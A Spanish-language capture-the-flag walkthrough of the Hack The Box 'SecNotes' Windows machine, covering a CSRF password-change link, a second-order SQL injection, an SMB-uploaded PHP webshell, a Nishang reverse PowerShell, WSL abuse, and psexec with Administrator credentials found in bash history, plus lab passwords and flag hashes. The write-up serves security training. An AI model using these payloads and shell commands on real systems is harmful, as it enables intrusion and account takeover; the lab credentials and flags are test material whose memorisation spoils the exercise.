---
tags:
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/151
dificultad: Media
ip: 10.10.10.97
os: Windows
relacionados:
  - "[[Cross-Site Request Forgery (SCRF)]]"
  - "[[Cross-Site Scripting (XSS)]]"
  - "[[SQL Injection (SQLi)|SQLI]]"
  - "[[IIS Exploitation]]"
  - "[[Abusing Linux subsystem]]"
  - "[[Information Leakage]]"
---
# HackTheBox - SecNotes

## Reconocimiento

### Escaneo de Puertos

Inicié mi fase de reconocimiento con un escaneo exhaustivo de todos los puertos TCP y UDP utilizando `masscan` para identificar rápidamente los puertos abiertos. Una vez que obtuve la lista, realicé un escaneo más detallado con `nmap` para obtener información sobre los servicios, versiones y ejecutar scripts de enumeración básicos.
```Bash
# Primero, un escaneo rápido con masscan para encontrar puertos abiertos
masscan -p1-65535,U:1-65535 10.10.10.97 --rate=1000 -e tun0 > allports

# Extraigo los puertos tcp abiertos con nmap
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 01_Reconnaissance/tcpport

# Escaneo TCP detallado con nmap
nmap -sCV -p80,445,8808 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

Los resultados de `nmap` mostraron los siguientes servicios de interés:
- **Puerto 80/tcp:** Microsoft IIS httpd 10.0
- **Puerto 445/tcp:** Microsoft Windows 7 - 10 microsoft-ds (Samba)
- **Puerto 8808/tcp:** Microsoft IIS httpd 10.0

### Análisis Web

Al inspeccionar los servicios web, encontré una aplicación PHP personalizada en el puerto 80. El puerto 8808 simplemente mostraba la página de bienvenida por defecto de IIS.

Decidí centrarme en la aplicación del puerto 80. Creé una cuenta de usuario para explorar la funcionalidad interna. Dentro, descubrí opciones para crear notas, cambiar la contraseña y un formulario de contacto que, curiosamente, mencionaba que los mensajes se enviarían a un usuario llamado **tyler**.


___

## Explotación de vulnerabilidades

### Opción 1) CSRF en Cambio de Contraseña (Sin Validación de Contraseña Actual)

Al analizar la función de cambio de contraseña, noté dos debilidades críticas que, combinadas, abrían una puerta a la explotación:
1. **Mecanismo de cambio de contraseña débil:** La aplicación no solicitaba la contraseña actual del usuario para establecer una nueva. Esto significa que cualquiera que pudiera realizar la petición en nombre del usuario podría cambiar su contraseña.
2. **Ausencia de protección CSRF:** No se implementaba ningún token anti-CSRF (Cross-Site Request Forgery) en los formularios.
    
> [!bug] Vulnerabilidad Combinada
> 
> La ausencia de un token CSRF permite que un atacante cree una petición maliciosa. Si a esto le sumamos que la función de cambio de contraseña no valida la contraseña antigua, es posible forzar a una víctima a cambiar su contraseña por una controlada por el atacante, simplemente haciendo que visite una URL.

Para explotar esto, capturé la petición de cambio de contraseña con Burp Suite. Originalmente era una petición POST. La convertí en una petición GET para poder construir una URL maliciosa y fácil de compartir.

La URL quedó así:
```http
http://10.10.10.97/change_pass.php?password=newpassword&confirm_password=newpassword&submit=submit
```

Sabiendo que el formulario de contacto enviaba mensajes a **tyler**, utilicé este formulario como vector de ataque, pegando la URL maliciosa en el cuerpo del mensaje. Mi suposición era que `tyler` revisaría el mensaje y haría clic en el enlace.

Poco después, intenté iniciar sesión con las credenciales `tyler:newpassword` y logré acceder a su cuenta. Dentro, encontré una nota que contenía credenciales para un recurso compartido SMB.

### Opción 2) Inyección SQL de Segundo Orden

Paralelamente, investigué la posibilidad de una inyección SQL. Inicialmente, intenté realizar un bypass de autenticación en el formulario de inicio de sesión utilizando payloads comunes de la lista `Generic-SQLi.txt` de SecLists, pero no tuve éxito.

Cambié mi enfoque a la página de **registro**. Al probar diferentes payloads, descubrí un comportamiento interesante. Cuando introduje el payload `' or 1=1--` como nombre de usuario, la aplicación devolvió el error: "This username is already taken". Esto fue un claro indicador de que la consulta SQL en el backend era vulnerable, ya que mi payload hizo que la condición `WHERE` siempre fuera verdadera.

> [!bug] ¿Qué es una Inyección SQL de Segundo Orden?
> 
> A diferencia de una inyección SQL estándar, donde el payload se ejecuta inmediatamente, una inyección de segundo orden ocurre cuando la aplicación almacena la entrada maliciosa (sin sanear) en la base de datos. El payload se ejecuta más tarde, cuando otra funcionalidad de la aplicación recupera y utiliza ese dato almacenado. En este caso, el registro almacena el payload y el inicio de sesión lo ejecuta.

Registré un usuario con el nombre `hacker' or 0=0 #"`. La aplicación aceptó el registro. Luego, me dirigí a la página de inicio de sesión e introduje ese mismo nombre de usuario con cualquier contraseña. La inyección SQL se disparó, la consulta devolvió el primer usuario de la base de datos (que resultó ser `tyler`), y logré acceder a su cuenta, visualizando la misma nota con las credenciales SMB.

### Acceso por SMB y Webshell

Con las credenciales obtenidas, ya sea por CSRF o por SQLi, procedí a acceder al recurso compartido SMB.
- **Share:** `\\secnotes.htb\new-site`
- **Credenciales:** `tyler` / `92g!mA8BGjOirkL%OG*&`
    
Usando `smbclient`, me conecté al recurso y confirmé que tenía permisos de escritura. Esto era ideal, ya que el recurso parecía ser el `wwwroot` del sitio web alojado en el puerto 8808. Para obtener ejecución de comandos, subí una webshell PHP muy simple:
```PHP
<?php echo shell_exec($_GET["cmd"]); ?>
```

Con la webshell en el servidor, ya podía ejecutar comandos en el sistema como el usuario `secnotes\tyler` a través del navegador.

### Obtención de una Reverse Shell

Una webshell es útil, pero una shell interactiva es mucho más potente. Para escalar mi acceso, decidí usar el script `Invoke-PowerShellTcp.ps1` del framework Nishang.

Los pasos fueron los siguientes:
1. Añadí la siguiente línea al final del script de Nishang para que se ejecutara automáticamente al ser invocado:
    Invoke-PowerShellTcp -Reverse -IPAddress <MI_IP> -Port <MI_PUERTO>
2. Subí el script modificado al servidor a través de la misma compartición SMB.
3. Puse un listener de `netcat` a la escucha en mi máquina (`nc -lvnp <MI_PUERTO>`).
4. Desde mi webshell, ejecuté el siguiente comando para invocar el script de PowerShell. Tuve que codificarlo en formato URL para pasarlo como parámetro GET:
```
powershell -ep bypass .\\Invoke-PowerShellTcp.ps1
```

Tras enviar la petición, recibí una conexión inversa en mi listener, obteniendo una shell interactiva como el usuario `secnotes\tyler`.


___

## Escalada de privilegios

### Enumeración de Windows Subsystem for Linux (WSL)

Una vez con una shell estable, comencé la fase de enumeración local en busca de vectores de escalada de privilegios. Al listar el contenido de `C:\`, encontré un archivo `Ubuntu.zip` y una carpeta `Distros\Ubuntu`. Esto inmediatamente me hizo sospechar de la presencia de **Windows Subsystem for Linux (WSL)**. También el usuario Tyler tenía un archivo `bash.lnk`

Busqué ejecutables interesantes que pudieran ofrecerme un camino para escalar privilegios. Mi búsqueda reveló la presencia de `bash.exe` y `wsl.exe`.
```PowerShell
cmd /c "where /R c:\windows bash.exe"
cmd /c "where /R c:\windows wsl.exe"
```

El hallazgo de estos binarios confirmó que **Windows Subsystem for Linux (WSL)** estaba instalado:
```powershell
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
```
Esto abría una nueva superficie de ataque. Decidí ejecutar `bash.exe` para entrar directamente en el entorno de Linux desde mi reverse shell de Windows.

Una vez dentro, la shell inicial era algo limitada, así que la mejoré a una TTY completamente interactiva usando Python. Esto me proporciona una experiencia de terminal mucho más estable y funcional.
```Bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Descubrimiento de Credenciales y Acceso Final

Ya dentro del entorno WSL y con una shell interactiva, noté que había aterrizado como el usuario **root** del subsistema Linux. Inmediatamente, busqué archivos que pudieran contener información sensible. El historial de comandos del usuario es siempre un buen lugar para empezar.

Al ejecutar `history`, encontré las credenciales del usuario Administrador del dominio, que habían sido utilizadas en un comando anterior y quedaron guardadas en texto plano.

> [!success] Credenciales de Administrador Encontradas
> 
> Usuario: secnotes\administrator
> 
> Contraseña: u6!4ZwgwOM#^OBf#Nwnh

Con estas credenciales de administrador, la escalada de privilegios era inminente. La forma más directa de obtener una shell con privilegios de sistema en Windows es utilizando `psexec.py` de Impacket desde mi máquina de atacante.
```Bash
psexec.py secnotes/administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
```

La ejecución fue exitosa y obtuve una shell interactiva como `NT AUTHORITY\SYSTEM`, dándome control total sobre la máquina y permitiéndome leer la bandera final en `C:\Users\Administrator\Desktop\root.txt`.


---

## Bandera(s)

> [!flag] `flag{user}`
> 24f917516408feb0e444506c34f7103e
^bandera-user

> [!flag] `flag{root}`
> 92bc1c12dbde4c6c1e46fd5a8f878ce0
^bandera-root
